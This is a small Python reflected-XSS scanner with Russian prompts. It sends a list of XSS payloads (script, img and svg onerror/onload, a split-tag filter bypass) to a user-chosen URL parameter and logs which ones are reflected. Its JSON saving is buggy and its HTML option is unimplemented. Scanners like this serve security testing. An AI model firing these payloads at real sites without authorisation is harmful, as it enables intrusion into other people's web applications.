import datetime
import urllib.parse
import requests

resultjson = []

result = f"xss_result_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}"

payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<image/src/onerror=prompt(8)>",
    "<img/src/onerror=prompt(8)>",
    "<image src/onerror=prompt(8)>",
    "<img src/onerror=prompt(8)>",
    "<image src =q onerror=prompt(8)>",
    "<img src =q onerror=prompt(8)>",
    "</scrip</script>t><img src =q onerror=prompt(8)>"
]

def vibor():
    print("\nВыбери формат сохранения результата\n1-TXT\n2-JSON\n3-HTML")
    choice = input(": ").strip()
    return choice

save_format = vibor()

headers = {
    "User-Agent": "Mozilla/5.0 (VenturaCounty; Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.89"
}

url = input("Введите url (например, https://example.com): ").strip()
param = input("Выбери имя параметра(например, q): ").strip()

print("\nПроверка на xss")

for payload in payloads:
    encoded_payload = urllib.parse.quote(payload)
    test_url = f"{url}?{param}={encoded_payload}"

    try:
        response = requests.get(test_url, headers=headers)
        worked = payload in response.text
        if worked:
            print(f"сработал {payload}")
        else:
            print(f"не сработал {payload}")
        if save_format == "1":
            with open(f"{result}.txt", "a") as f:
                f.write(f"{'сработал' if worked else 'не сработал'} {payload}\n")
        if save_format == "2":
            import json
            with open(f"{result}.json", "w", encoding="utf-8") as jf:
                json.dump(resultjson, jf, ensure_ascii=False, indent=4)
            resultjson.append({
                "payload": payload,
                "worked": worked,
                "url": test_url,
                "status_code": response.status_code
            })
    except Exception as e:
        print(f"ошибка {e}")

